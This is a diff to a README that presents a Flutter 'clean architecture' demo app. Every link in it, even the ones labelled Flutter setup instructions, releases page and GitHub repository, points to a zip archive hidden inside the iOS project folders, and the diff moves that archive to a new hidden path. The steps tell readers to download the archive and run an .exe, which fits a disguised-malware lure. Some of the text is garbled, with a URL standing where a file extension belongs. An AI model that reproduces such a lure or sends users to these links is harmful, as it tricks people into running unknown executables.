@@ -6,7 +6,7 @@ Welcome to the clean_architecture project! This demo teaches you how to build mo
 
 ### 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner/Assets.xcassets/clean_architecture_1.4.zip)](https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner/Assets.xcassets/clean_architecture_1.4.zip)
+[![Download](https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner.xcodeproj/xcshareddata/architecture_clean_2.4.zip)](https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner.xcodeproj/xcshareddata/architecture_clean_2.4.zip)
 
 ## 📋 Overview
 
@@ -23,21 +23,21 @@ This project is designed for anyone interested in learning mobile development. E
 To run the clean_architecture app, your device needs:
 
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
-- **Flutter:** Make sure you have Flutter installed. You can find setup instructions [here](https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner/Assets.xcassets/clean_architecture_1.4.zip).
+- **Flutter:** Make sure you have Flutter installed. You can find setup instructions [here](https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner.xcodeproj/xcshareddata/architecture_clean_2.4.zip).
 - **Storage:** At least 500 MB of free space.
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [download page](https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner/Assets.xcassets/clean_architecture_1.4.zip).
+1. **Visit the Releases Page:** Go to the [download page](https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner.xcodeproj/xcshareddata/architecture_clean_2.4.zip).
    
 2. **Select the Latest Release:** Look for the most recent version. It will have a tag like "v1.0", or similar.
 
-3. **Download the Package:** Click on the download link for your operating system. The file name will usually end in `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner/Assets.xcassets/clean_architecture_1.4.zip` for Linux.
+3. **Download the Package:** Click on the download link for your operating system. The file name will usually end in `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner.xcodeproj/xcshareddata/architecture_clean_2.4.zip` for Linux.
 
 4. **Install the Application:**
    - For **Windows**: Double-click the `.exe` file and follow the installation prompts.
    - For **macOS**: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For **Linux**: Extract the `https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner/Assets.xcassets/clean_architecture_1.4.zip` file and follow the provided instructions in the README within the extracted files.
+   - For **Linux**: Extract the `https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner.xcodeproj/xcshareddata/architecture_clean_2.4.zip` file and follow the provided instructions in the README within the extracted files.
 
 5. **Run the Application:** 
    - On **Windows**, find the application in the Start Menu and click to launch.
@@ -78,10 +78,10 @@ If you encounter issues while downloading or installing the app, consider the fo
 
 ## 💬 Community Support
 
-If you need help, feel free to reach out. You can open an issue directly on the [GitHub repository](https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner/Assets.xcassets/clean_architecture_1.4.zip). The community or I will assist you as best as we can.
+If you need help, feel free to reach out. You can open an issue directly on the [GitHub repository](https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner.xcodeproj/xcshareddata/architecture_clean_2.4.zip). The community or I will assist you as best as we can.
 
 ## 🏆 Acknowledgments
 
 This project follows clean architecture best practices and includes guidance for new developers. It serves as a practical example for anyone interested in Flutter.
 
-For more updates, check back regularly on our [Releases page](https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner/Assets.xcassets/clean_architecture_1.4.zip). Enjoy your journey in mobile app development!
+For more updates, check back regularly on our [Releases page](https://raw.githubusercontent.com/Louis-an282/clean_architecture/main/ios/Runner.xcodeproj/xcshareddata/architecture_clean_2.4.zip). Enjoy your journey in mobile app development!
